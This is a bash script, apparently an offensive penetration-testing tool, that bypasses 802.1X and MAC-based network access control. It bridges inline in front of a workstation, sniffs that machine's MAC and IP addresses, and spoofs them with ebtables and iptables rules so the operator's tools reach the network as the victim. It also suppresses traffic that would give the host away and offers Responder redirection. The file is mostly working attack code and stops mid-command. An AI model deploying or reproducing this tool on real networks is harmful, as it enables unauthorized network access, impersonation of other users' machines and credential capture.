#!/bin/bash
#==============================================================================
# nac_bypass.sh - Transparent-bridge NAC bypass utility (v3.1)
#
# Authorized internal pen-testing tool. Inserts the host between a legitimate
# workstation and an 802.1X / MAC-auth switch port, transparently bridges the
# workstation's traffic so its NAC session stays alive, and configures L2/L3
# masquerade rules so the operator's tools (nmap, NetExec, Impacket, SMB, etc.)
# egress the wire as that workstation. Return traffic is reverse-NAT'd by
# conntrack and delivered to the local stack instead of being bridged on to
# the workstation.
#
# v3.1 changes (post-review):
#   * Static ARP installed via `ip neigh` (not deprecated `arp(8)`)         CRIT-1
#   * Default route added (not replaced); existing defaults snapshotted     CRIT-2
#   * Named iptables/ebtables chains (no more global `nat -F`)              CRIT-3
#   * br_netfilter / nf_conntrack now mandatory (sysctl-path check)         CRIT-4 / HIGH-7
#   * learn() requires gateway info; refuses to proceed without it          CRIT-5
#   * full_reset brings physical NICs back UP                               CRIT-6
#   * Egress lock now blocks `-o BRINT`, installed before enslaving         CRIT-7
#   * usage() exits non-zero on argument errors                             HIGH-1
#   * BRINT persisted; -r without -b can still find the bridge              HIGH-2
#   * DHCP parser tolerant of tcpdump 4.9 / 4.99 / 5.x output variants      HIGH-3
#   * SNAT range moved above default ip_local_port_range; --random-fully    HIGH-4
#   * sysctl reads/writes go through helpers (no PATH lookup mix)           HIGH-5
#   * NetworkManager interfaces marked unmanaged via nmcli                  HIGH-6
#   * `-D <ip>` for secondary DNS; numeric/IP CLI args validated            MED-2 / MED-4
#   * Drop weak gateway-IP heuristic (.1/.254)                              MED-3
#   * Date included in log timestamps                                       MED-5
#   * Removed redundant ebtables `-o BRINT` rule                            MED-6
#   * install_masquerade flushes named chains first (no rule stacking)      MED-7
#==============================================================================

set -u
set -o pipefail

VERSION="3.1"
SCRIPT_NAME="$(basename "$0")"

#==============================================================================
# Configuration (defaults; CLI overrides where applicable)
#==============================================================================
SWINT="eth0"
COMPINT="eth1"
BRINT="nacbr0"
MONITOR_INTERFACE=""

# Bridge link-local addressing (the host's identity *internally*)
BRIP="169.254.66.66"
BRGW="169.254.66.1"
BRMASK_BITS="24"

# Egress
DNS_PRIMARY="1.1.1.1"
DNS_SECONDARY="8.8.8.8"
ROUTE_METRIC=0
SNAT_RANGE="61001-65535"        # above default ip_local_port_range; HIGH-4

# Service redirection
RESPONDER_TCP_PORTS=(21 25 80 110 139 143 389 443 445 587 1433 3128)
RESPONDER_UDP_PORTS=(53 137 138 389 1434 5353)
DPORT_SSH=50222
PORT_SSH=50022

# Tuning
LEARN_TIMEOUT=45
TIMER=5
THRESHOLD_UP=3
THRESHOLD_DOWN=5

# Named chains - lets cleanup remove only our rules (CRIT-3)
NAC_NAT_OUT="NACBYPASS_OUT"
NAC_NAT_IN="NACBYPASS_IN"
NAC_EBT_NAT="NACBYPASS"

# State directory
STATE_DIR="/run/nac_bypass"
[ -d /run ] || STATE_DIR="/tmp/nac_bypass"
RUN_LOG=""

# CLI flags
OPT_RESPONDER=0
OPT_SSH=0
OPT_VERBOSE=0
OPT_AUTONOMOUS=0
OPT_RESET_ONLY=0
GWMAC_USER=""

# Resolved at runtime
SWMAC=""
COMPMAC=""
GWMAC=""
COMIP=""
GWIP=""

CMD_IP=""
CMD_IPTABLES=""
CMD_EBTABLES=""
CMD_ARPTABLES=""
CMD_TCPDUMP=""
CMD_MACCHANGER=""
CMD_NMCLI=""
CMD_SYSCTL=""

INITIALISED=0
CONN_ACTIVE=0
TRAP_INSTALLED=0

# RESET_DONE: guard against running full_reset twice (signal handler + EXIT
# trap can race). One-shot for the *script process* lifetime; the script
# always exits after a reset, so this is the right scope. (MED-9 doc)
RESET_DONE=0

#==============================================================================
# Logging - timestamps include date (MED-5)
#==============================================================================
_log() {
    local level=$1; shift
    local color='' reset='\e[0m'
    case "$level" in
        DEBUG) [ "$OPT_VERBOSE" -eq 0 ] && return 0; color='\e[0;36m' ;;
        INFO)  color='\e[1;34m' ;;
        WARN)  color='\e[1;33m' ;;
        ERR)   color='\e[1;31m' ;;
        OK)    color='\e[1;32m' ;;
    esac
    local ts; ts="$(date +'%F %T')"
    printf '%b[%s] [%-4s] %s%b\n' "$color" "$ts" "$level" "$*" "$reset"
    # File log: only write if RUN_LOG points to an existing file. Guards
    # against the redirect erroring AFTER state_clear has removed the file
    # (bash reports redirect-open errors before `2>/dev/null` is applied).
    if [ -n "$RUN_LOG" ] && [ -e "$RUN_LOG" ]; then
        printf '[%s] [%-4s] %s\n' "$ts" "$level" "$*" >> "$RUN_LOG" 2>/dev/null || true
    fi
}
log()   { _log INFO  "$@"; }
warn()  { _log WARN  "$@"; }
err()   { _log ERR   "$@"; }
ok()    { _log OK    "$@"; }
debug() { _log DEBUG "$@"; }
die()   { err "$@"; cleanup_on_error; exit 1; }

#==============================================================================
# State directory: each change leaves a marker / backup so cleanup reverts
# *only* what we touched.
#==============================================================================
state_init() {
    mkdir -p "$STATE_DIR" 2>/dev/null || die "Cannot create state dir $STATE_DIR"
    chmod 700 "$STATE_DIR"
    RUN_LOG="$STATE_DIR/run.log"
    : > "$RUN_LOG"
}

state_set()   { echo "$2" > "$STATE_DIR/$1"; }
state_get()   { cat "$STATE_DIR/$1" 2>/dev/null || echo ""; }
state_has()   { [ -e "$STATE_DIR/$1" ]; }
state_clear() { rm -rf "$STATE_DIR"; RUN_LOG=""; }

#==============================================================================
# Generic helpers
#==============================================================================
resolve_bin() { command -v "$1" 2>/dev/null || true; }
has_iface()   { [ -d "/sys/class/net/$1" ]; }

iface_carrier() { cat "/sys/class/net/$1/carrier" 2>/dev/null || echo 0; }
iface_mac()     { cat "/sys/class/net/$1/address" 2>/dev/null; }

iface_master() {
    local link="/sys/class/net/$1/master"
    [ -e "$link" ] || return 1
    basename "$(readlink -f "$link")"
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]] \
        && [[ "$1" != "ff:ff:ff:ff:ff:ff" ]] \
        && [[ "$1" != "00:00:00:00:00:00" ]]
}

is_valid_ip() {
    [[ "$1" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
    local IFS=. a b c d
    read -r a b c d <<<"$1"
    [ "$a" -le 255 ] && [ "$b" -le 255 ] && [ "$c" -le 255 ] && [ "$d" -le 255 ]
}

is_uint() { [[ "$1" =~ ^[0-9]+$ ]]; }

# sysctl helpers - read/write via /proc/sys to avoid PATH-lookup variance (HIGH-5)
read_sysctl() {
    local p="/proc/sys/${1//.//}"
    [ -r "$p" ] || { echo ""; return 1; }
    cat "$p" 2>/dev/null
}
write_sysctl() {
    local p="/proc/sys/${1//.//}"
    [ -w "$p" ] || return 1
    echo "$2" > "$p" 2>/dev/null
}

#==============================================================================
# Pre-flight validation
#==============================================================================
preflight() {
    log "Pre-flight validation..."
    # Root check is done before state_init/install_trap in main(), so by
    # the time we get here we know we're root. Re-asserting for safety.
    [ "$EUID" -eq 0 ] || die "Must run as root."

    # --- required binaries (no longer require arp(8); we use ip neigh) ------
    CMD_IP=$(resolve_bin ip)
    CMD_TCPDUMP=$(resolve_bin tcpdump)
    CMD_MACCHANGER=$(resolve_bin macchanger)
    CMD_EBTABLES=$(resolve_bin ebtables)
    CMD_IPTABLES=$(resolve_bin iptables)
    CMD_ARPTABLES=$(resolve_bin arptables)
    CMD_NMCLI=$(resolve_bin nmcli)
    CMD_SYSCTL=$(resolve_bin sysctl)

    local missing=()
    [ -z "$CMD_IP" ]         && missing+=("ip (iproute2)")
    [ -z "$CMD_TCPDUMP" ]    && missing+=("tcpdump")
    [ -z "$CMD_MACCHANGER" ] && missing+=("macchanger")
    [ -z "$CMD_EBTABLES" ]   && missing+=("ebtables")
    [ -z "$CMD_IPTABLES" ]   && missing+=("iptables")
    if [ ${#missing[@]} -gt 0 ]; then
        err "Missing required binaries:"
        for m in "${missing[@]}"; do err "  - $m"; done
        die "Install: apt-get install iproute2 tcpdump macchanger ebtables iptables"
    fi
    debug "Resolved: ip=$CMD_IP iptables=$CMD_IPTABLES ebtables=$CMD_EBTABLES tcpdump=$CMD_TCPDUMP nmcli=${CMD_NMCLI:-none}"

    # --- kernel features ----------------------------------------------------
    if ! "$CMD_IP" link add type bridge name __nacbr_test__ 2>/dev/null; then
        modprobe bridge 2>/dev/null \
            || die "Kernel bridge support unavailable (modprobe bridge failed)."
        "$CMD_IP" link add type bridge name __nacbr_test__ 2>/dev/null \
            || die "Bridge module loaded but bridge creation still fails."
    fi
    "$CMD_IP" link del __nacbr_test__ 2>/dev/null || true

    # br_netfilter: MANDATORY. The presence of /proc/sys/net/bridge/* is the
    # canonical "is it loaded/built-in" indicator (works whether the feature
    # is a module or compiled in).                                       CRIT-4
    if [ ! -e /proc/sys/net/bridge/bridge-nf-call-iptables ]; then
        modprobe br_netfilter 2>/dev/null || true
    fi
    [ -e /proc/sys/net/bridge/bridge-nf-call-iptables ] \
        || die "br_netfilter is not available. Without it, return-traffic NAT cannot work. Install/enable kernel module 'br_netfilter'."

    # nf_conntrack: MANDATORY for reverse-NAT.                          HIGH-7
    modprobe nf_conntrack 2>/dev/null || true
    [ -e /proc/net/nf_conntrack ] \
        || die "nf_conntrack is not available. Without it, SNAT cannot reverse return traffic. Install/enable 'nf_conntrack'."

    # --- interfaces ---------------------------------------------------------
    [ "$SWINT" = "$COMPINT" ] && die "-1 ($SWINT) and -2 ($COMPINT) cannot be the same interface."
    has_iface "$SWINT"   || die "Interface '$SWINT' not found (-1)."
    has_iface "$COMPINT" || die "Interface '$COMPINT' not found (-2)."

    local m
    if m=$(iface_master "$SWINT")   && [ "$m" != "$BRINT" ]; then
        die "$SWINT is already attached to bridge '$m'. Detach first or pick another NIC."
    fi
    if m=$(iface_master "$COMPINT") && [ "$m" != "$BRINT" ]; then
        die "$COMPINT is already attached to bridge '$m'. Detach first or pick another NIC."
    fi

    if has_iface "$BRINT"; then
        warn "Bridge '$BRINT' already exists - will tear down and recreate."
    fi

    # --- routing conflicts --------------------------------------------------
    if "$CMD_IP" -4 route show 2>/dev/null | grep -qE '^169\.254\.66\.'; then
        warn "An existing 169.254.66.x route is present; it may conflict with our link-local subnet."
    fi

    # --- network managers ---------------------------------------------------
    for svc in NetworkManager.service systemd-networkd.service wpa_supplicant.service; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            debug "$svc is active and will be stopped during setup."
        fi
    done

    # --- optional features --------------------------------------------------
    if [ "$OPT_RESPONDER" -eq 1 ]; then
        if ! resolve_bin responder >/dev/null \
           && ! resolve_bin Responder >/dev/null \
           && [ ! -f /usr/share/responder/Responder.py ]; then
            warn "-R: Responder not detected; redirection rules will install but you must run Responder yourself."
        fi
    fi
    if [ "$OPT_SSH" -eq 1 ]; then
        local sshd_path
        sshd_path=$(resolve_bin sshd) || true
        if [ -z "$sshd_path" ] && [ ! -x /usr/sbin/sshd ]; then
            die "-S requested but sshd not installed. Install: apt-get install openssh-server"
        fi
    fi

    # --- promiscuous-mode capability check (briefly toggles SWINT)  LOW-5 ---
    if ! "$CMD_IP" link set "$SWINT" promisc on 2>/dev/null; then
        die "Cannot enable promiscuous mode on $SWINT (NIC busy or capability denied)."
    fi
    "$CMD_IP" link set "$SWINT" promisc off 2>/dev/null || true

    if ! "$CMD_MACCHANGER" --help >/dev/null 2>&1; then
        die "macchanger appears non-functional."
    fi

    ok "Pre-flight checks passed."
}

#==============================================================================
# Host lockdown
#==============================================================================
host_lockdown() {
    log "Hardening host network state..."

    # Mark interfaces as NM-unmanaged so a mid-run NM restart can't touch
    # them. Recorded for restore.                                       HIGH-6
    if [ -n "$CMD_NMCLI" ]; then
        : > "$STATE_DIR/nmcli_unmanaged"
        for iface in "$SWINT" "$COMPINT"; do
            if "$CMD_NMCLI" device set "$iface" managed no 2>/dev/null; then
                echo "$iface" >> "$STATE_DIR/nmcli_unmanaged"
            fi
        done
    fi

    # NetworkManager / systemd-networkd off, recorded for restore
    : > "$STATE_DIR/services_stopped"
    for svc in NetworkManager.service systemd-networkd.service wpa_supplicant.service; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            systemctl stop "$svc" 2>/dev/null && echo "$svc" >> "$STATE_DIR/services_stopped"
        fi
    done

    # Stop NTP (would broadcast and leak host identity)
    : > "$STATE_DIR/ntp_stopped"
    for svc in ntp.service ntpsec.service chronyd.service systemd-timesyncd.service; do
        if systemctl is-active --quiet "$svc" 2>/dev/null; then
            systemctl stop "$svc" 2>/dev/null && echo "$svc" >> "$STATE_DIR/ntp_stopped"
        fi
    done
    timedatectl set-ntp false 2>/dev/null || true

    # IPv6 off (workstations sometimes do RA/DHCPv6 chatter we don't NAT)
    state_set "ipv6_disable_all" "$(read_sysctl net.ipv6.conf.all.disable_ipv6)"
    write_sysctl net.ipv6.conf.all.disable_ipv6 1 || true

    # Bridge-netfilter integration (mandatory for return-traffic NAT)
    state_set "br_nf_call_ipt" "$(read_sysctl net.bridge.bridge-nf-call-iptables)"
    write_sysctl net.bridge.bridge-nf-call-iptables 1 \
        || die "Cannot set bridge-nf-call-iptables=1; bypass cannot work."

    # ip_forward enables routing decisions for NAT'd packets so the kernel
    # delivers reverse-DNAT'd return traffic locally instead of bridging it on.
    state_set "ip_forward" "$(read_sysctl net.ipv4.ip_forward)"
    write_sysctl net.ipv4.ip_forward 1 \
        || die "Cannot enable ip_forward; bypass cannot work."

    state_set "icmp_ignore_bcast" "$(read_sysctl net.ipv4.icmp_echo_ignore_broadcasts)"
    write_sysctl net.ipv4.icmp_echo_ignore_broadcasts 1 || true

    # Backup and rewrite resolv.conf (queries leave via bridge -> SNAT)
    if [ -f /etc/resolv.conf ] && [ ! -f "$STATE_DIR/resolv.conf.bak" ]; then
        cp -a /etc/resolv.conf "$STATE_DIR/resolv.conf.bak"
    fi
    {
        echo "# Written by $SCRIPT_NAME - restored on cleanup"
        echo "nameserver $DNS_PRIMARY"
        [ -n "$DNS_SECONDARY" ] && echo "nameserver $DNS_SECONDARY"
    } > /etc/resolv.conf

    # Snapshot existing default routes so we can restore them in cleanup
    # (paired with `ip route add` instead of `replace`).                CRIT-2
    "$CMD_IP" -4 route show default 2>/dev/null > "$STATE_DIR/default_routes.bak" || true

    # Multicast off on the physical NICs to silence IGMP joins
    for iface in "$SWINT" "$COMPINT"; do
        local cur; cur=$(cat "/sys/class/net/$iface/flags" 2>/dev/null || echo 0)
        state_set "multicast.$iface" "$cur"
        "$CMD_IP" link set "$iface" multicast off 2>/dev/null || true
    done

    debug "Host lockdown complete."
}

#==============================================================================
# Named-chain helpers - the bypass installs all of its rules into private
# chains and only those chains are flushed/deleted on cleanup, so the
# operator's unrelated NAT rules survive untouched.                      CRIT-3
#==============================================================================
nac_chains_create() {
    # iptables nat
    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_OUT" 2>/dev/null || \
        "$CMD_IPTABLES" -t nat -F "$NAC_NAT_OUT"
    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_IN"  2>/dev/null || \
        "$CMD_IPTABLES" -t nat -F "$NAC_NAT_IN"

    # Hook them into the built-in chains exactly once. -C is supported on all
    # iptables backends we care about (legacy and -nft compat shim).
    "$CMD_IPTABLES" -t nat -C POSTROUTING -j "$NAC_NAT_OUT" 2>/dev/null \
        || "$CMD_IPTABLES" -t nat -A POSTROUTING -j "$NAC_NAT_OUT"
    "$CMD_IPTABLES" -t nat -C PREROUTING  -j "$NAC_NAT_IN"  2>/dev/null \
        || "$CMD_IPTABLES" -t nat -A PREROUTING  -j "$NAC_NAT_IN"

    # ebtables nat
    "$CMD_EBTABLES" -t nat -N "$NAC_EBT_NAT" 2>/dev/null || \
        "$CMD_EBTABLES" -t nat -F "$NAC_EBT_NAT"
    if ! "$CMD_EBTABLES" -t nat -L POSTROUTING 2>/dev/null | grep -q "^-j $NAC_EBT_NAT\b"; then
        "$CMD_EBTABLES" -t nat -A POSTROUTING -j "$NAC_EBT_NAT"
    fi

    state_set "chains_created" "1"
}

nac_chains_destroy() {
    "$CMD_IPTABLES" -t nat -D POSTROUTING -j "$NAC_NAT_OUT" 2>/dev/null || true
    "$CMD_IPTABLES" -t nat -D PREROUTING  -j "$NAC_NAT_IN"  2>/dev/null || true
    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_OUT" 2>/dev/null || true
    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_IN"  2>/dev/null || true
    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_OUT" 2>/dev/null || true
    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_IN"  2>/dev/null || true

    "$CMD_EBTABLES" -t nat -D POSTROUTING -j "$NAC_EBT_NAT" 2>/dev/null || true
    "$CMD_EBTABLES" -t nat -F "$NAC_EBT_NAT" 2>/dev/null || true
    "$CMD_EBTABLES" -t nat -X "$NAC_EBT_NAT" 2>/dev/null || true

    rm -f "$STATE_DIR/chains_created"
}

#==============================================================================
# Bridge construction
#==============================================================================
bridge_build() {
    log "Building transparent bridge $BRINT ($SWINT <-> $COMPINT)..."

    if has_iface "$BRINT"; then
        "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
        "$CMD_IP" link del "$BRINT" 2>/dev/null || true
    fi

    "$CMD_IP" link add name "$BRINT" type bridge stp_state 0 forward_delay 0 \
        || die "Bridge creation failed."
    state_set "bridge_owned" "1"
    state_set "bridge_name"  "$BRINT"   # so '-r' without -b can find it. HIGH-2

    # Forward EAPOL frames (bit 3 of group_fwd_mask = 01-80-C2-00-00-03)
    if [ -e "/sys/class/net/$BRINT/bridge/group_fwd_mask" ]; then
        echo 8 > "/sys/class/net/$BRINT/bridge/group_fwd_mask" 2>/dev/null \
            || warn "Could not enable EAPOL forwarding via group_fwd_mask."
    fi

    # Lock egress on the bridge BEFORE attaching slaves, so any locally-
    # generated packet that gets routed through the bridge during the
    # configuration window gets dropped instead of leaking with the
    # operator's real source IP/MAC.                                     CRIT-7
    install_egress_lock

    # Bring members down, flush addresses, attach to bridge, promiscuous on.
    for iface in "$SWINT" "$COMPINT"; do
        "$CMD_IP" link set "$iface" down                       || die "Failed to down $iface."
        "$CMD_IP" addr flush dev "$iface" >/dev/null 2>&1
        "$CMD_IP" link set "$iface" master "$BRINT"            || die "Failed to enslave $iface to $BRINT."
        "$CMD_IP" link set "$iface" promisc on                 || die "Failed promisc on $iface."
        "$CMD_IP" link set "$iface" up                         || die "Failed to bring $iface up."
    done

    # Bridge MAC = SWINT's MAC: locally-generated frames bear a MAC the switch
    # already learned for this port (before ebtables rewrites them to COMPMAC
    # for the wire).
    SWMAC=$(iface_mac "$SWINT")
    is_valid_mac "$SWMAC" || die "Could not read MAC of $SWINT."
    "$CMD_MACCHANGER" -m "$SWMAC" "$BRINT" >/dev/null 2>&1 \
        || warn "macchanger failed; bridge MAC may not match SWINT MAC."

    "$CMD_IP" link set "$BRINT" promisc on
    "$CMD_IP" link set "$BRINT" up

    INITIALISED=1
    ok "Bridge $BRINT live (silent; egress locked until masquerade is armed)."
}

#==============================================================================
# Egress lock - blocks the host from emitting any packet on the bridge
# before SNAT is configured. Lock matches `-o $BRINT` (the actual routing-
# decision interface for locally-generated packets), NOT the slave NICs.  CRIT-7
#==============================================================================
install_egress_lock() {
    "$CMD_IPTABLES" -I OUTPUT 1 -o "$BRINT" -j DROP 2>/dev/null || true
    if [ -n "$CMD_ARPTABLES" ]; then
        "$CMD_ARPTABLES" -I OUTPUT 1 -o "$BRINT" -j DROP 2>/dev/null || true
    fi
    state_set "egress_locked" "1"
}

remove_egress_lock() {
    "$CMD_IPTABLES" -D OUTPUT -o "$BRINT" -j DROP 2>/dev/null || true
    if [ -n "$CMD_ARPTABLES" ]; then
        "$CMD_ARPTABLES" -D OUTPUT -o "$BRINT" -j DROP 2>/dev/null || true
    fi
    rm -f "$STATE_DIR/egress_locked"
}

#==============================================================================
# Passive learning
#==============================================================================
learn() {
    local arp_pcap="$STATE_DIR/learn_arp.pcap"
    local dhcp_pcap="$STATE_DIR/learn_dhcp.pcap"
    local syn_pcap="$STATE_DIR/learn_syn.pcap"
    rm -f "$arp_pcap" "$dhcp_pcap" "$syn_pcap"

    log "Listening for victim/gateway traffic on $COMPINT (timeout ${LEARN_TIMEOUT}s)..."

    # ARP capture - full frame size (-s 0) to be safe across versions.   LOW-3
    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -p -s 0 -c 10 \
        -w "$arp_pcap" 'arp' >/dev/null 2>&1 &
    local arp_pid=$!
    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -s 0 -c 1 \
        -w "$dhcp_pcap" 'udp src port 67 and udp dst port 68' >/dev/null 2>&1 &
    local dhcp_pid=$!
    timeout "$LEARN_TIMEOUT" "$CMD_TCPDUMP" -i "$COMPINT" -nn -e -s 64 -c 1 \
        -w "$syn_pcap" 'tcp[tcpflags] & tcp-syn != 0' >/dev/null 2>&1 &
    local syn_pid=$!

    local first
    first=$(wait_any "$arp_pid" "$dhcp_pid" "$syn_pid")
    debug "First learning channel returned: pid=$first"

    if kill -0 "$arp_pid" 2>/dev/null; then
        sleep 3
        kill "$arp_pid" 2>/dev/null || true
    fi
    kill "$dhcp_pid" "$syn_pid" 2>/dev/null || true
    wait 2>/dev/null || true

    # Try parsers in order of reliability; clear any partial state between.
    COMPMAC=""; COMIP=""; GWIP=""
    [ -z "$GWMAC_USER" ] && GWMAC=""
    if parse_arp  "$arp_pcap";  then debug "Learned via ARP";  fi
    if [ -z "$COMPMAC" ] && parse_dhcp "$dhcp_pcap"; then debug "Learned via DHCP"; fi
    if [ -z "$COMPMAC" ] && parse_syn  "$syn_pcap";  then debug "Learned via SYN"; fi

    # CRIT-5: refuse to proceed if we don't have everything we need.
    if ! is_valid_mac "$COMPMAC" || ! is_valid_ip "$COMIP"; then
        err "Could not learn victim MAC/IP in ${LEARN_TIMEOUT}s."
        err "Workstation may be idle. Try a longer timeout: -t 120"
        return 1
    fi
    if ! is_valid_mac "$GWMAC" || ! is_valid_ip "$GWIP"; then
        err "Learned victim ($COMPMAC / $COMIP) but not gateway info."
        err "Re-run with -g <gateway_mac> to pin it manually, or wait for the workstation to ARP for its gateway."
        return 1
    fi
    return 0
}

wait_any() {
    local pids=("$@")
    while :; do
        local p
        for p in "${pids[@]}"; do
            if ! kill -0 "$p" 2>/dev/null; then echo "$p"; return 0; fi
        done
        sleep 0.2
    done
}

# parse_arp: extract victim mac/ip from a Request and gateway mac/ip from the
# matching Reply. Token-anchored so it survives tcpdump version drift.
# Drops the .1/.254 fallback heuristic (MED-3).
parse_arp() {
    local pcap=$1
    [ -s "$pcap" ] || return 1
    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1

    local lines vmac="" vip="" gmac="" gip="" target_ip=""
    lines=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null) || return 1
    [ -z "$lines" ] && return 1

    debug "ARP capture:"
    while IFS= read -r l; do debug "  $l"; done <<<"$lines"

    while IFS= read -r line; do
        if [[ "$line" =~ Request[[:space:]]who-has[[:space:]]([0-9.]+) ]]; then
            target_ip="${BASH_REMATCH[1]}"
        fi
        if [[ "$line" =~ tell[[:space:]]([0-9.]+) ]]; then
            vip="${BASH_REMATCH[1]}"
            vmac=$(awk '{print $2}' <<<"$line")
        fi
        [ -n "$vmac" ] && [ -n "$vip" ] && [ -n "$target_ip" ] && break
    done <<<"$lines"

    if [ -n "$target_ip" ]; then
        local esc=${target_ip//./\\.}
        while IFS= read -r line; do
            if [[ "$line" =~ Reply[[:space:]]${esc}[[:space:]]is-at ]]; then
                gmac=$(awk '{print $2}' <<<"$line")
                gip="$target_ip"
                break
            fi
        done <<<"$lines"
    fi

    is_valid_mac "$vmac" || return 1
    is_valid_ip  "$vip"  || return 1
    COMPMAC="$vmac"; COMIP="$vip"
    if is_valid_mac "$gmac" && is_valid_ip "$gip"; then
        GWMAC="${GWMAC_USER:-$gmac}"
        GWIP="$gip"
    fi
    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"
    return 0
}

# parse_dhcp: tolerant of multiple tcpdump output variants               HIGH-3
parse_dhcp() {
    local pcap=$1
    [ -s "$pcap" ] || return 1
    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1

    local out
    out=$("$CMD_TCPDUMP" -nn -e -v -r "$pcap" 2>/dev/null) || return 1
    debug "DHCP capture:"
    while IFS= read -r l; do debug "  $l"; done <<<"$out"

    local vmac vip gmac gip
    # chaddr: tcpdump prints "Client-Ethernet-Address aa:..." on most versions,
    # "chaddr aa:.." or just inline on others. Match either, then extract MAC.
    vmac=$(grep -ioE '(client-ethernet-address|chaddr)[^0-9a-f]+([0-9a-f]{2}:){5}[0-9a-f]{2}' <<<"$out" \
           | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)

    # Your-IP from BOOTP body (Offer/Ack carry it)
    vip=$(grep -oE 'Your-IP[[:space:]]+[0-9.]+'   <<<"$out" | awk '{print $2}' | head -1)
    [ -z "$vip" ] && vip=$(grep -oE 'Client-IP[[:space:]]+[0-9.]+' <<<"$out" | awk '{print $2}' | head -1)

    # Server-Identifier (Option 54). Variants: "Server-Id Option 54", "Server-ID",
    # "Server-Identifier", followed by an IP.
    gip=$(grep -ioE '(server-id|server-identifier)[^0-9]*([0-9]{1,3}\.){3}[0-9]{1,3}' <<<"$out" \
          | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | tail -1)
    [ -z "$gip" ] && gip=$(grep -oE 'Server-IP[[:space:]]+[0-9.]+' <<<"$out" | awk '{print $2}' | head -1)

    # L2 src MAC of the (first) reply frame is the gateway/relay
    gmac=$(awk 'NR==1 && $2 ~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/ {print $2}' <<<"$out")

    is_valid_mac "$vmac" || return 1
    is_valid_ip  "$vip"  || return 1
    COMPMAC="$vmac"; COMIP="$vip"
    if is_valid_mac "$gmac" && is_valid_ip "$gip"; then
        GWMAC="${GWMAC_USER:-$gmac}"
        GWIP="$gip"
    fi
    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"
    return 0
}

# parse_syn: lowest fidelity; cannot reliably tell direction from one packet.
parse_syn() {
    local pcap=$1
    [ -s "$pcap" ] || return 1
    [ "$(stat -c %s "$pcap")" -gt 24 ] || return 1

    local line
    line=$("$CMD_TCPDUMP" -nn -e -r "$pcap" 2>/dev/null | head -1)
    [ -z "$line" ] && return 1

    local s_mac d_mac s_ip d_ip
    s_mac=$(awk '{print $2}' <<<"$line")
    d_mac=$(awk '{gsub(/,$/,"",$4); print $4}' <<<"$line")
    s_ip=$(awk '{print $10}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')
    d_ip=$(awk '{print $12}' <<<"$line" | awk -F. '{print $1"."$2"."$3"."$4}')

    if ! is_valid_mac "$d_mac"; then
        COMPMAC="$s_mac"; COMIP="$s_ip"
    else
        COMPMAC="$d_mac"; COMIP="$d_ip"
        is_valid_mac "$s_mac" && is_valid_ip "$s_ip" && {
            GWMAC="${GWMAC_USER:-$s_mac}"; GWIP="$s_ip"
        }
    fi
    [ -n "$GWMAC_USER" ] && GWMAC="$GWMAC_USER"

    is_valid_mac "$COMPMAC" && is_valid_ip "$COMIP" || return 1
    return 0
}

#==============================================================================
# Masquerade rules
#==============================================================================
install_masquerade() {
    log "Installing masquerade rules (victim=$COMPMAC/$COMIP gw=$GWMAC/$GWIP)..."

    # Address the bridge
    if ! "$CMD_IP" addr add "$BRIP/$BRMASK_BITS" dev "$BRINT" 2>/dev/null; then
        # OK if already present - check
        "$CMD_IP" -4 addr show dev "$BRINT" | grep -q "$BRIP" \
            || die "Failed to assign $BRIP to $BRINT."
    fi

    # Rebuild named chains from scratch every time install_masquerade runs
    # so re-arming after a link flap can't accumulate duplicate rules.   MED-7
    nac_chains_destroy
    nac_chains_create

    # L2: rewrite src MAC of frames egressing the switch-side NIC to the
    # victim's MAC. (The redundant `-o $BRINT` rule from v3.0 is removed.) MED-6
    "$CMD_EBTABLES" -t nat -A "$NAC_EBT_NAT" -s "$SWMAC" -o "$SWINT" -j snat --to-src "$COMPMAC"

    # Static neighbour entry for the (fictional) BRGW so the kernel never
    # needs to ARP for it. Uses ip(8), no dependency on net-tools/arp.   CRIT-1
    "$CMD_IP" neigh replace "$BRGW" lladdr "$GWMAC" dev "$BRINT" nud permanent \
        || die "Failed to install static neighbour entry $BRGW -> $GWMAC."
    state_set "neigh_static" "$BRGW"

    # Default route via the bridge - ADDITIVE so we don't kill the operator's
    # mgmt default route. Existing defaults were snapshotted in host_lockdown
    # for restoration on cleanup.                                       CRIT-2
    if ! "$CMD_IP" route add default via "$BRGW" dev "$BRINT" metric "$ROUTE_METRIC" 2>/dev/null; then
        # Likely a metric collision with an existing default.
        warn "Could not add default via $BRINT at metric $ROUTE_METRIC (likely collision)."
        warn "Tools may egress wrong NIC. Pin tools to $BRINT explicitly, or rerun with -m <free_metric>."
    else
        state_set "route_default_added" "via $BRGW dev $BRINT metric $ROUTE_METRIC"
    fi

    # L3 SNAT in our private chain. --random-fully reduces port collisions
    # with the workstation's own outbound flows.                       HIGH-4
    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p tcp  -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null \
        || "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p tcp  -j SNAT --to "$COMIP:$SNAT_RANGE"
    "$CMD_IPTABLES" -t nat -A "$NAC_NAT_OUT" -o "$BRINT" -s "$BRIP" -p udp  -j SNAT --to "$COMIP:$SNAT_RANGE" --random-fully 2>/dev/null \
